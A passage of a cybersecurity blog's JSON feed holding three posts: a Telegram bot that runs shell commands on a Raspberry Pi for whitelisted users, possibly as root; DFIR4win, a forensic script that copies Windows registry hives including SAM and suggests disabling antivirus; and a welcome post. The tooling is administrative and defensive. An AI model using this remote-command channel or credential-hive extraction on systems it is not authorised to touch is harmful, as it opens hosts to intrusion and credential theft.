            "content_html": "<p>Today I bring you a project that I finished some time ago, but that has earned a place in my favourite projects: a bot for Telegram.<br><br>Ok, but what is the difference between this bot and any other ‘hello_world_telgrambot.py’ bot on the internet? Basically, this one is capable of interpreting commands on the machine that is running it (Linux) 💣<br><br>Before we throw our hands up in the air ‘Oh no, it's open to the internet and anyone can access it! Yes, that's true, and I know it, but that's why I've added a security measure that's as simple as it is reliable.<br><br>Each Telegram user has a unique ID, so let's use it to our advantage.<br><br></p>\n<blockquote>\n<p>Raspberry Pi, in every message sent to the Telegram bot, compare the ID of the sender with the ones I have put in your whitelist. If the ID doesn't match, it's NOT me, so don't pay attention to it. </p>\n</blockquote>\n<p><br>Although I have tried to make it plug-and-play, reducing a lot the necessary configuration to be able to replicate it to your liking, I want to mention several things here even though everything is explained in the comments in the code itself and its repository.<br><br></p>\n<p>You can see the project in my Github: <a href=\"https://github.com/b4shnhawx/ssh-telegram-bot\">b4shnhawx/ssh-telegram-bot</a></p>\n<div class=\"tittle__line\">\n<h3><br>UNDERSTANDING THE SCRIPT</h3>\n<hr class=\"line\">\n<p>First of all, please note that the following dependencies must be installed:<br><br></p>\n<pre class=\"language-python\"><code>pip3 install telebot\npip3 install python-telegram-bot</code></pre>\n<p>I have divided the code into three parts. Mandatory, Optional and Main.</p>\n<ul>\n<li><strong>Mandatory</strong>: As the name indicates, this part of the code is the minimum for the SSH bot to work.<br><br>In this section you only need to change the token of your bot, and the chat IDs you want to allow. You can put as many IDs as you want separated by commas in case you want multiple users to have access to the same machine.<br><br>\n<pre class=\"language-python\"><code>........\n\n### -----------------------------------------------\n### --------- MANDATORY CODE FOR SSH BOT ----------\n### -----------------------------------------------\n\n### --- VARIABLES ---\n\n........\n\ntoken = \"xxxxxxxxx:ABCDEFabcdef...\"\npermit_chat_id = (CHAT_ID_1, CHAT_ID_2, CHAT_ID_3...)\n\n........</code></pre>\n</li>\n<li><strong>Optional</strong>: Here you can add or modify the existing options and functions as you wish. In my case, the options that I have added are <em>ping_pc</em>, <em>public_ip</em>,<em> magic_packet_pc</em>,<em> suspend_pc MINUTOS</em>,<em> logoff_pc</em>,<em> shut_down_pc</em>,<em> cmd bash command</em>.<br><br>In this section is where you should put the variables for your optional functions. In case you don't want any other optional functions, you can delete all the content up to the MAIN section.<br><br>\n<pre class=\"language-python\"><code>........\n\n### ------------------------------------------------\n### -------- OPTIONAL FUNCTIONS FOR THE BOT --------\n### ------------------------------------------------\n\n### --- VARIABLES ---\n\nmac_magic_packet = \"MAC_ADDRESS\"\nip_pc = \"IP_ADDRESS\"\nuser = \"USER\"\npassword = \"PASSWORD\"\n\n........</code></pre>\n<p>To add new functions, at the end of the optional functions I have left an example / template (called EXAMPLE COMMAND) to add other commands with arguments.<br><br>Don't forget that if you add new optional functions, you should add them in the MANDATORY section in the /start and /test commands so that they appear as help.<br><br></p>\n</li>\n<li><strong>Main</strong>: It is the part that runs the bot, so it should not be changed.</li>\n</ul>\n<div class=\"tittle__line\">\n<h3><strong>USE CASE EXAMPLES</strong></h3>\n<hr class=\"line\">\n<p> </p>\n<p>To enable and disable SSH mode, simply send the command /terminal. At this point, the bot will indicate the status of the terminal and if it is active, anything we send will be interpreted as a command and the output will be sent to us.<br>(Note that it has its limitations, so don't expect to do a ‘man ssh’ to work xD)</p>\n<p> </p>\n<div style=\"text-align: center;\"><img loading=\"lazy\" style=\"width: 50%; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/ssh-telegram-bot/main/images/command.jpg\" alt=\"Command example\" data-is-external-image=\"true\"></div>\n<div> </div>\n<div>Also if the script belongs to root you can get the permissions inherited and execute commands with root.<br><br><br>An example of an intrusion attempt would be this:</div>\n<ol>\n<li>A user without permissions (left screenshot) starts the bot and tries to send the /terminal command to enable SSH (yellow). He also sends several commands to validate if he has access to the machine (green and blue), but the bot has not allowed terminal mode to be enabled.</li>\n<li>To the users in the whitelist it sends a message with the information (middle screenshot), warning that a user has started the bot (red).</li>\n<li>When the anonymous user sends the command /terminal (right screenshot), it will send us a message indicating that it has tried to execute a command (yellow), as well as resending us the command attempts (green and blue).</li>\n</ol>\n<div style=\"text-align: center;\"><img loading=\"lazy\" style=\"width: 100%; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/ssh-telegram-bot/main/images/img_intrusion.jpg\" alt=\"Command example\" data-is-external-image=\"true\"></div>\n<div> </div>\n<div> </div>\n<div> </div>\n</div>\n</div>",
            "image": "https://b4shnhawx.github.io/media/posts/6/command.jpg",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "raspberrypi",
                   "python",
                   "programming",
                   "networking"
            ],
            "date_published": "2024-08-21T00:34:28+02:00",
            "date_modified": "2024-08-22T19:18:58+02:00"
        },
        {
            "id": "https://b4shnhawx.github.io/dfir4win-automates-the-artifacts-extraction.html",
            "url": "https://b4shnhawx.github.io/dfir4win-automates-the-artifacts-extraction.html",
            "title": "DFIR4win - Automates the artifacts extraction",
            "summary": "Manually extracting artefacts from an infected computer can sometimes be tedious with so much information to search for, documents and logs. That's why the less time it&hellip;",
            "content_html": "<p>Manually extracting artefacts from an infected computer can sometimes be tedious with so much information to search for, documents and logs. That's why the less time it takes to extract the most relevant information, the longer we can spend looking for any clues or evidence.<br><br>With this idea in mind I found in Github a script that looked very good from the user <a href=\"https://github.com/AlrikRr\">AlrikRr</a> (I invite you to take a look at his cool projects), specifically I'm talking about <a href=\"https://github.com/AlrikRr/Forensic-Extract\">Forensic-Extract</a>.</p>\n<p>Looking at his project I thought <em>\"OK, it extracts very useful information and records, but... what if I add the option to extract hives?\"</em>, so I took advantage of it and made a few more changes:<br><br></p>\n<ul>\n<li>Translated the code into English</li>\n<li>Optimised the code as much as I could</li>\n<li>Added the option to extract hives</li>\n<li>Added a Microsoft Defender status checker</li>\n</ul>\n<p>You can see the project in my Github: <a href=\"https://github.com/b4shnhawx/DFIR4win/tree/main\">b4shnhawx/DFIR4win</a></p>\n<p> </p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://b4shnhawx.github.io/media/posts/5/dfir4win_demo_noav.gif\" alt=\"\" width=\"774\" height=\"486\"></figure>\n<p> </p>\n<p>DFIR4win can automate the collection of most of the data you need to analyse activity on a Windows machine and compress it all into a ZIP file.<br>It includes:</p>\n<p> </p>\n<ul>\n<li>Relevant host information</li>\n<li>Event logs</li>\n<li>Log hives (for more details, see Microsoft documentation)</li>\n</ul>\n<p><br>If you want to extract the hives, you may need to disable the real-time protection of your antivirus (AV), as it may consider the action suspicious. By default, Windows uses Windows Defender.</p>\n<p><br>This script detects whether your active AV is Windows Defender or some other third-party antivirus. If it is the latter, it is possible that other modules of your AV are blocking the extraction of the files, so I recommend you to manually check if all the files you need have been extracted correctly.</p>\n<p><br>If the script is not working properly to extract the files, you can do it manually with a program (such as Eric Zimmerman's Registry Explorer).</p>\n<p> </p>\n<p>This would be the final directory tree:<br><br></p>\n<pre class=\"language-bash\"><code>./HOST_DD-MM-YYYY.zip\n |\n |-- REGS\n |    |-- *_HOST_DD-MM-YYYY.evtx\n |\n |-- HIVES\n |    |-- Security.hiv\n |    |-- SAM.hiv\n |    |-- DEFAULT.hiv\n |    |-- NTUSER_USERNAME.DAT\n |    |-- System.hiv\n |    |-- USRCLASS_USERNAME.DAT\n |    |-- Software.hiv\n |\n |-- Host-Info_HOST_DD-MM-YYYY.txt</code></pre>\n<p> </p>\n<p>You have all the information about how the script works in the repository 😁</p>\n<p> </p>",
            "image": "https://b4shnhawx.github.io/media/posts/5/dfir4win.png",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "windows",
                   "programming",
                   "powershell",
                   "os",
                   "hacking",
                   "deffensive"
            ],
            "date_published": "2024-08-19T19:28:44+02:00",
            "date_modified": "2024-08-21T00:07:44+02:00"
        },
        {
            "id": "https://b4shnhawx.github.io/first-post.html",
            "url": "https://b4shnhawx.github.io/first-post.html",
            "title": "Welcome to my blog - First post!",
            "summary": "Hello to all of you! For a long time I wanted to start a project where I could share some of my projects, achievements, experiences or ideas&hellip;",
            "content_html": "<p>Hello to all of you!<br><br>For a long time I wanted to start a project where I could share some of my projects, achievements, experiences or ideas in the cybersecurity world, so, what better way than with a blog?<br><br>In this blog I will try to upload content from different areas of cybersecurity, some more complex, others not so much ... you will see.<br><br>A summary of some of the things I want to upload:<br>- Networking<br>- Raspberry Pi<br>- Programming in python, PowerShell and of course, my beloved bash.<br>- Flipper Zero<br>- Although it is not my expertise, some ethical hacking.<br><br>That's all, see you around!</p>",
            "image": "https://b4shnhawx.github.io/media/posts/4/j2hkcly5xc781.png",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "personal"
            ],
            "date_published": "2024-08-18T02:54:26+02:00",
            "date_modified": "2024-08-21T18:19:10+02:00"
        }
    ]
}
